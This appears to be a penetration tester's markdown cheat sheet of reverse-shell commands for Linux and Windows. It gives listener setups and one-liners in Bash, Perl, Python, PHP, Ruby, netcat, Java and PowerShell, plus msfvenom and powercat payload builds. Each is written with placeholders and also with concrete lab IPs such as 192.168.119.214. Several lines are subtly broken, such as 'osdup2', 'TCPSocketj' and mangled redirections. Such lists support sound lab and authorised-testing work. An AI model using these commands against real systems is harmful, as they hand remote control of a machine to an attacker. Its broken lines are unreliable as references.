# Listeners
### ncat
```
nc -nvlp $port
```

### Powercat
```
powercat -l -p $port
```

### msf multi/handler
```
set payload path/to/payload
set LHOST X.X.X.X
set LPORT $port
```

# Linux Listener
### Bash
```
/bin/bash -c "/bin/bash -i >& /dev/tcp/X.X.X.X/$port 0>&1"

/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.119.214/80 0>&1"
```

### Perl
```
perl -e 'use Socket;$i="X.X.X.X";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -e 'use Socket;$i="192.168.119.214";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("X.X.X.X",$port));os.dup2(s.fileno(),0); osdup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.214",80));os.dup2(s.fileno(),0); 	os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```
php -r '$sock=fsockopen("X.X.X.X",$port);exec("/bin/bash -i &3 2>&3");'

php -r '$sock=fsockopen("172.16.4.3",9001);exec("/bin/bash -i &3 2>&3");'
```

# Ruby
```
ruby -rsocket -e'f=TCPSocketj.open("$ip",$port).to_i;exec sprintf("/bin/sh -i &%d 2>&%d",f,f,f)'

ruby -rsocket -e'f=TCPSocketj.open("192.168.119.214",80).to_i;exec sprintf("/bin/sh -i &%d 2>&%d",f,f,f)'
```

### Netcat : -u for UDP
```
nc [-u] X.X.X.X $port -e /bin/bash

nc [-u] 192.168.119.214 80 -e /bin/bash
```

### Netcat without -e : -u for UDP
```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [-u] $ip $port > /tmp/f

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [-u] 192.168.119.214 80 > /tmp/f
```

### Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5/dev/tcp/$ip/$port;cat &5 >&5; done"] as String[])
p.waitFor()

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5/dev/tcp/192.168.119.214/80;cat &5 >&5; done"] as String[])
p.waitFor()
```

	
	
# Windows

### Powershell Invoke-PowerShellTcp.ps1
```
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
vi shell.ps1
	Go to end of file and paste following
Invoke-PowerShellTcp -Reverse -IPAddress $ip -Port $port
	Save, Close, Ready to use
```

### Powershell One Liner
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('X.X.X.X',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.214',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```


### Ncat - x63 or x86 per target, same for PS or CMD
```
nc.exe X.X.X.X $port -e cmd.exe OR powershell.exe

nc.exe 192.168.119.214 80 -e cmd.exe

nc.exe 192.168.119.214 80 -e powershell.exe
```

### Powercat
```
powercat -c X.X.X.X -p $port -e cmd OR powershell

powercat -c 192.168.119.214 -p 80 -e cmd

powercat -c 192.168.119.214 -p 80 -e powershell
```

# System binaries/payloads

### Linux reverse shell - Staged
```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=X.X.X.X LPORT=$port -f elf > shell

msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.119.214 LPORT=80 -f elf > shell
```

### Linux reverse shell - Stageless
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=X.X.X.X LPORT=$port -f elf > shell

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.214 LPORT=80 -f elf > shell
```

### Windows reverse shell - Staged
```
msfvenom -p windows/shell/reverse_tcp LHOST=X.X.X.X LPORT=$port -f exe -o reverse.exe

msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.214 LPORT=80 -f exe -o reverse.exe
```

### Windows reverse shell - Stageless
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X.X.X.X LPORT=$port -f exe -o reverse.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.214 LPORT=80 -f exe -o reverse.exe
```

### Powercat Payload
```
powercat -c X.X.X.X -p $port -e cmd/powershell -g

powercat -c X.X.X.X -p $port -e cmd/powershell -ge

powercat -c 192.168.119.214 -p 80 -e powershell -ge
```
